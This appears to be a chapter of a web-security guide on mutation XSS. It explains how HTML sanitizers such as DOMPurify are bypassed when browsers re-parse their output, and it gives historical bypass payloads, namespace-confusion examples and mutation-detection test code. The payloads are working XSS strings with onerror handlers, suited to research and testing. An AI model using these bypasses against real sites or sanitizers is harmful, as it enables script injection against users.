# 03 — Mutation XSS (mXSS)

## Overview

Mutation XSS exploits discrepancies between how an HTML sanitizer parses a string and how the browser's HTML parser re-parses the sanitized output when it is inserted into the DOM. The sanitizer sees a benign string; the browser's parser transforms it into something that executes JavaScript.

The root cause is that HTML serialization and re-parsing are not identity operations. Namespace context, implied parent elements, and parser state machines can all differ between the sanitizer's internal representation and the browser's live DOM.

---

## 1. The Serialization → Re-Parse Loop

The mXSS lifecycle:

1. **Input:** Attacker submits a crafted HTML string.
2. **Sanitization:** The sanitizer parses the string, removes dangerous nodes, and serializes the result back to a string (e.g., via `innerHTML` getter or equivalent).
3. **Injection:** The sanitized string is assigned to `element.innerHTML`.
4. **Re-parse:** The browser's HTML parser processes the string again — this time in a different context or with different state — and creates DOM nodes that were not present during sanitization.
5. **Execution:** The re-parsed DOM contains executable content.

```
Input HTML
    ↓ sanitizer.parse()
  Sanitized DOM
    ↓ element.innerHTML (serialization)
  Serialized string
    ↓ target.innerHTML = sanitized  (re-parse)
  Live DOM  ← mutation occurred here
```

---

## 2. SVG/MathML Namespace Confusion

The HTML parser switches between the HTML namespace, the SVG namespace, and the MathML namespace based on context. Tags that are text in one namespace become executable elements in another.

### SVG `<script>` via Foreign Content

Inside an SVG namespace, `<script>` is a valid, executable element. DOMPurify (pre-3.0) and other sanitizers that operate in the HTML namespace may fail to recognize SVG-context `<script>` tags as dangerous when they appear inside certain SVG container elements.

```html
<!-- mXSS via SVG foreignObject (historical DOMPurify bypass) -->
<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
```

When parsed in SVG namespace, `<style>` is a non-special element and `</style>` is treated as text. When re-serialized and re-parsed in HTML namespace context, `</style>` closes the style element and `<img onerror>` executes.

### MathML Annotation Namespace Escape

```html
<!-- MathML mXSS via annotation-xml with encoding=text/html -->
<math><annotation-xml encoding="text/html"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>
```

The `annotation-xml` element with `encoding=text/html` causes the HTML parser to switch back to HTML parsing mode inside MathML, creating a namespace escape.

---

## 3. Concrete DOMPurify Bypass Payloads (Historical CVEs)

### Bypass 1 — DOMPurify < 2.0.1 (2019)

**CVE:** No separate CVE assigned; tracked in DOMPurify issue tracker.

```html
<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
```

The sanitizer parsed the inner `<style>` element in SVG context (where style is non-special) and allowed it. On re-parse in HTML context, `</style>` closes the element and the `<img onerror>` executes.

### Bypass 2 — DOMPurify < 2.2.3 (noembed mutation)

```html
<noembed><img src="</noembed><img src=x onerror=alert(1)>">
```

The sanitizer parsed `<noembed>` and treated the content as raw text (noembed content is raw text in HTML). The `src` attribute value contained `</noembed>`, which the sanitizer's serializer re-emitted intact. On re-parse, the browser ended the `<noembed>` at the embedded closing tag and treated the rest as markup.

### Bypass 3 — template Element Mutation (DOMPurify < 2.3.6)

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

This payload exploits the interaction between `<form>` (which cannot be nested), `<math>`, and `<mtext>`. The parser's foster parenting rules and namespace switching cause the final `<img>` to land outside the sanitized subtree on re-parse.

---

## 4. Element Mutation Patterns

### noembed

`<noembed>` content is raw text in browsers that support scripting (since the browser "knows" scripting is enabled so noembed never renders). Sanitizers that parse it as markup may not detect injected closing tags within the value.

```html
<noembed><img src="</noembed><img src=x onerror=alert(1)>">
```

### template

`<template>` content exists in a separate document fragment (the template content document). Sanitizers that traverse `innerHTML` may miss nodes inside the `<template>` because the content is not part of the main document DOM.

```html
<template id="t"><img src=x onerror=alert(1)></template>
<script>
  // Sanitizer may not look inside template.content
  document.body.innerHTML = document.getElementById('t').innerHTML;
</script>
```

### style

Inside SVG or MathML, `<style>` is a generic element (not a raw-text element as it is in HTML). Injecting content that looks like a closed style tag inside a serialized SVG can cause mutation on re-parse.

```html
<svg><style><a title="</style><img src=x onerror=alert(1)>">
```

---

## 5. Testing for mXSS

### Manual Testing

1. Inject candidate payloads targeting each of the mutation patterns above.
2. Observe whether the sanitized output *string* (use `console.log(sanitized)`) differs from what the live DOM looks like after assignment.
3. Specifically check:
   - Does `element.innerHTML` after assignment differ from the sanitized string?
   - Are any attributes or tag names different in the live DOM?
   - Are any new elements present that were not in the sanitized string?

```javascript
const input = '<svg><p><style><g title="</style><img src=x onerror=alert(1)>">';
const sanitized = DOMPurify.sanitize(input);
console.log('Sanitized string:', sanitized);

const div = document.createElement('div');
div.innerHTML = sanitized;
console.log('After re-parse:', div.innerHTML);

// If these two values differ, mXSS may be occurring
```

### Automated Testing

Use the [DOMPurify test harness](https://github.com/cure53/DOMPurify/tree/main/test) to run the full mutation test suite. For custom sanitizers:

```javascript
// Mutation detection wrapper
function testMutation(sanitizer, payload) {
  const sanitized = sanitizer(payload);
  const probe = document.createElement('div');
  probe.innerHTML = sanitized;
  const after = probe.innerHTML;
  if (sanitized !== after) {
    console.warn('MUTATION DETECTED');
    console.warn('Before:', sanitized);
    console.warn('After:', after);
    return true;
  }
  return false;
}
```

Automated fuzzing: use [Mutation Observer fuzz tools](https://github.com/nicowillis/mxss-payloads) or the `domino` library to diff parse outputs.

---

## References

- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations — Heyes & Roth](https://cure53.de/fp170.pdf)
- [DOMPurify Security Advisories](https://github.com/cure53/DOMPurify/security/advisories)
- [PortSwigger mXSS Research](https://portswigger.net/research/mutation-xss-via-namespace-confusion)
- [HTML5 Parsing Algorithm — WHATWG](https://html.spec.whatwg.org/multipage/parsing.html)
